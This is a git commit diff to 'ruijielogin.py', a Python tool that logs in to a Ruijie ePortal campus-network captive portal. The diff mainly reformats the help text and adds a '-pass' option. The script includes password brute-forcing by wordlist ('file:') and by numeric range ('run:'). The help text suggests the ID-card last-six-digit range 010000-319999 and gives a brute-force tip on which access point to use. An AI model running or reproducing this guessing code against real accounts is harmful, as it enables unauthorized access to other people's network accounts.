2548349e05a1bc83a38c7828d7ff35ca660fdddc
alittlemc <43811017+alittlemc@users.noreply.github.com>
2021-10-02 01:59:56 +0800

    优化部分逻辑 合理设置-v -pass 等参数

--- ruijielogin.py
+++ ruijielogin.py
@@ -12,38 +12,42 @@ PASSWORD = '-1'
 SERVICE = r'0'
 OPENURL = r'http://www.google.cn/generate_204'
 ERR_STR = """
-        -h  显示帮助,输入此项后只输出提示.
+        -h      显示帮助,输入此项后只输出提示.
 
-        -v  显示完整输出.
+        -v      显示完整输出,可能会造成刷屏.
 
-        -u  [字符串 user]    *后面加用户名(必填).
+        -u      [字符串 user]    *后面加用户名(必填).
 
-        -p  [字符串 password]   *后面加密码(必填).
-             1)可以直接填写密码
-             #暴力破解注意事项# 跑密码建议请选择可以登录"校园网络"的接入点测试,或者请选择正确的运营商.
-             2)file:文件路径 可以实现跑弱口令,逐行读取.
-             3)run:数字1-数字2 从 数字1 跑到 数字2 结束,
-                (身份证后六位范围010000-319999).
+        -p      [字符串 password]   *后面加密码(必填).
+                1)可以直接填写密码
+                #暴力破解注意事项# 跑密码建议请选择可以登录"校园网络"的接入点测试,或者请选择正确的运营商.
+                2)file:文件路径 可以实现跑弱口令,逐行读取.
+                3)run:数字1-数字2 从 数字1 跑到 数字2 结束,
+                    (身份证后六位范围010000-319999).
+                    (建议加上pass参数)
 
-        -id [数字 0到1]  后面输入0-3 默认0,[
-             0="校园网络",
-             1="中国移动ChinaMobile",
-             2="中国电信ChinaTelecom",
-             3="中国联通ChinaUnicom"]
+        -id     [数字 0到1]  后面输入0-3 默认0,[
+                0="校园网络",
+                1="中国移动ChinaMobile",
+                2="中国电信ChinaTelecom",
+                3="中国联通ChinaUnicom"],不同学校运营商定义名称可能不同,请在源代码内手动修改数组.
 
-        -t  [数字 秒]  循环登录,会根据当前输入的账号密码反复执行,延时{time}秒.不可以和跑密码(file和run)同时使用.
-             停止请CRTL+C.
-             假如你已经登录,可能就无法使用-t,因为需要读取同目录下URL.txt文件来读取入网地址,请使用-URL参数生成,正常登录获取.
+        -t      [数字 秒]  循环登录,会根据当前输入的账号密码反复执行,延时{time}秒.不可以和跑密码(file和run)同时使用.
+                手动停止请CRTL+C,或者配合-pass使用,登录成功后就退出.
+                假如你已经登录,可能就无法使用-t,因为需要读取同目录下URL.txt文件来读取入网地址,请使用-URL参数生成,正常登录获取.
 
-        -ti [数字 秒]   配合循环登录使用,默认true(无限大),可以设置在{time}秒内登录,-ti次后结束.
+        -ti     [数字 秒]   配合循环登录使用,默认true(无限大),可以设置在{time}秒内登录,-ti次后结束.
 
-        -URL 1)使用此命令会自动保存入网地址到同目录下URL.txt文件,
-                2)如果此文件已经存在就忽略当前是否已经登录,直接用URL.txt的参数,每一个设备或接入点不同URL都不同,如果本地URL.txt过时或者错误请手动删除.
-                    3)如果你需要在已经登录情况下发包就必须先获取URl.txt.
+        -pass   在重复验证中,会验证是否可连接外网,成功即验证成功,会额外消耗一定性能.
+
+        -URL    1)使用此命令会自动保存入网地址到同目录下URL.txt文件,
+                    2)如果此文件已经存在就忽略当前是否已经登录,直接用URL.txt的参数,每一个设备或接入点不同URL都不同,如果本地URL.txt过时或者错误请手动删除.
+                        3)如果你需要在已经登录情况下发包就必须先获取URl.txt.
 
         https://github.com/alittlemc/ePortal-Web-Ruijie
-        version 1.32
+        version 1.33
 """
+
 
 def get_captive_server_response():
     return requests.get(OPENURL)
@@ -59,12 +63,20 @@ def start(code, response):
     else:
         print_v = False
 
+    if "-pass" in code:
+        print_pass = False
+    else:
+        print_pass = True
+
     if "-u" in code:
         USERNAME = code[code.index("-u")+1]
+    else:
+        print("缺少 -u 用户名")
 
     if "-id" in code:
         id_i = int(code[code.index("-id")+1])
-        if id_i >= len(id):
+        if id_i >= len(id) and id_i > 0:
+            print("-id", id_i, " 超出取值范围")
             id_i = 0
     else:
         id_i = 0
@@ -72,26 +84,26 @@ def start(code, response):
     SERVICE = id[id_i]
 
     if "-t" in code:
-        t=int(code[code.index("-t")+1])
+        t = int(code[code.index("-t")+1])
     else:
-        t=0
+        t = 0
 
     if "-ti" in code:
-        ti=int(code[code.index("-ti")+1])
+        ti = int(code[code.index("-ti")+1])
     else:
-        ti=-1
+        ti = -1
 
     if "-p" in code:
         PASSWORD = code[code.index("-p")+1]
         i = 0
+        #INFO = "-alittlemc"
         if "file:" in PASSWORD:
-            
+            print("匹配到file关键字")
             PASSWORD = PASSWORD[5:]
             for p in open(PASSWORD):
-                p=p.replace("\n","")
+                p = p.replace("\n", "")
                 i += 1
                 re = login(response, USERNAME, str(p), SERVICE)
-
                 if "success" in re:
                     return '{\"result\":\"success\",\"message\",\"第'+str(i)+'次尝试完成,密码是'+p+'\"}'
                 elif print_v:
@@ -99,12 +111,13 @@ def start(code, response):
             return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
         elif "run:" in PASSWORD:
             try:
+                print("匹配到run关键字")
                 arr = PASSWORD[4:].split("-")
                 for p in range(int(arr[0]), int(arr[1])+1):
-                    p=str(p)
-                    l=len(p)
-                    if l<6:
-                        p="0"*(6-l)+p
+                    p = str(p)
+                    l = len(p)
+                    if l < 6:
+                        p = "0"*(6-l)+p
                     i += 1
                     re = login(response, USERNAME, str(p), SERVICE)
                     if "success" in re:
@@ -113,23 +126,35 @@ def start(code, response):
                         print(p+":\n"+re)
                 return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
             except Exception as e:
-                print(e, '116-lin')
+                print(e, '129-lin')
 
         else:
-            if t>0:
-                i=1
-                f=open(r'URL.txt')
-                requests=f.read()
-                while i!=ti:
-                    print("编号i:",i,"ti:",ti-i)
+            if t > 0:
+                i = 1
+                f = open(r'URL.txt')
+                requests = f.read()
+                while i != ti:
                     #t = Timer(t, login, [response, USERNAME, PASSWORD, SERVICE])
                     #t.start()
-                    print(login(response, USERNAME, PASSWORD, SERVICE))
+                    re = login(response, USERNAME, PASSWORD, SERVICE)
+                    #print(get_captive_server_response().status_code)
+                    if print_pass:
+                        if print_v:
+                            print("编号i:", i, "ti:", ti-i)
+                            print(re)
+                    elif get_captive_server_response().status_code == 204:
+                        return re
+                    else:
+                        print(re)
                     sleep(t)
-                    i+=1
+                    i += 1
                 #t.cancel()
+                return "登陆操作",i,"次"
             else:
                 return login(response, USERNAME, PASSWORD, SERVICE)
+    else:
+        return "缺少 -p 密码"
+
 
 def login(response, USERNAME, PASSWORD, SERVICE):
     #response_text = response.text
@@ -152,39 +177,40 @@ def login(response, USERNAME, PASSWORD, SERVICE):
         data=login_post_data,
         headers=headers
     )
-    
+
     return login_result.content.decode('utf-8')
 
 
 if __name__ == '__main__':
     try:
-        if "-h" in sys.argv:
+        print(len(sys.argv))
+        if "-h" in sys.argv or len(sys.argv)<=4:
             print(ERR_STR)
         else:
             captive_server_response = get_captive_server_response()
             if "-URL" in sys.argv:
-                unt=True
+                unt = True
             else:
-                unt=False
+                unt = False
 
             if captive_server_response.status_code != 204 or unt:
                 if unt:
                     if os.path.exists('URL.txt'):
-                        f=open(r'URL.txt','r')
-                        fout=f.read()
+                        f = open(r'URL.txt', 'r')
+                        fout = f.read()
                         f.close()
-                        print('#本地URL',fout)
+                        print('#本地URL', fout)
                         print(start(sys.argv, fout))
                     else:
-                        f=open(r'URL.txt','w')
+                        f = open(r'URL.txt', 'w')
                         f.write(str(captive_server_response.text))
                         f.close()
-                        print('#无本地URL',captive_server_response.text)
+                        print('#无本地URL', captive_server_response.text)
                         print(start(sys.argv, captive_server_response.text))
                 else:
-                    print('URL',captive_server_response.text)
+                    print('URL', captive_server_response.text)
                     print(start(sys.argv, captive_server_response.text))
             else:
                 print('当前已经可以连接网络,无需连接')
     except Exception as e:
-        print("#错误信息",e,"\n",)
+        print("#错误信息", e, "\n",)
